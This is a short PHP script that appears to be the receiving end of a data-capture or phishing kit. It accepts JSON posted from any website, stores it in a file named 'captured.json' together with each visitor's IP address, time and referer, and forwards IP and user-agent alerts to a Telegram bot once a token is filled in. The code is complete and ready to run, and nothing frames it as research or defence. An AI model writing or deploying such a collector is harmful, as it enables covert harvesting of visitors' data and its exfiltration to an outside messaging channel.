<?php
header("Content-Type: application/json");
header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Methods: POST, OPTIONS");
header("Access-Control-Allow-Headers: Content-Type");
if ($_SERVER["REQUEST_METHOD"] === "OPTIONS") { http_response_code(200); exit; }
$logFile = __DIR__ . "/../logs/captured.json";
$input = file_get_contents("php://input");
$data = json_decode($input, true);
if (!$data) { http_response_code(400); echo json_encode(["status"=>"error"]); exit; }
$data["ip"] = $_SERVER["REMOTE_ADDR"] ?? "unknown";
$data["time"] = date("Y-m-d H:i:s");
$data["referer"] = $_SERVER["HTTP_REFERER"] ?? "";
$entries = [];
if (file_exists($logFile)) { $entries = json_decode(file_get_contents($logFile), true) ?: []; }
$entries[] = $data;
file_put_contents($logFile, json_encode($entries, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE));
$botToken = "YOUR_BOT_TOKEN";
$chatId = "YOUR_CHAT_ID";
if ($botToken !== "YOUR_BOT_TOKEN") {
    $msg = "VIEWER_KICKED\nIP: " . $data["ip"] . "\nUA: " . substr($data["data"]["userAgent"] ?? "-", 0, 80) . "\nTime: " . $data["time"];
    @file_get_contents("https://api.telegram.org/bot{$botToken}/sendMessage?" . http_build_query(["chat_id"=>$chatId,"text"=>$msg]));
}
echo json_encode(["status"=>"ok"]);
